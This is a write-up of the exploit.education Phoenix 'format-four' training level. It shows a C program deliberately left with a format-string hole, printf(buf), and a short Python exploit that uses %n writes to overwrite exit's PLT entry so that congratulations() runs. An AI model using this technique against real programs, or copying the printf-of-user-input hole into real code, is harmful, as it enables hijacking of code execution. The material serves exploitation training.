# Format Four

## Code

```
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

## Solution
As before we need to change a value, in this case we need to change the address (0x80497e4) the exit adrress in the plt to point to the cpngratulation address (0x08048503). We can get the congratulations address using objdump, and gdb for the exit address.

```
import struct

add = 0x80497e4
buff = struct.pack("<I", add)
buff += "JUNK"
buff += struct.pack("<I", add + 2)
buff += "%08x" * 10 + "%" + str(0x8503 - len(buff) - 80) + "x" + "%n"
buff += "%" + str(0x10804 - 0x8503) + "x" + "%n"

print(buff)
```

```
python ~/format4.py | ./format-four
```
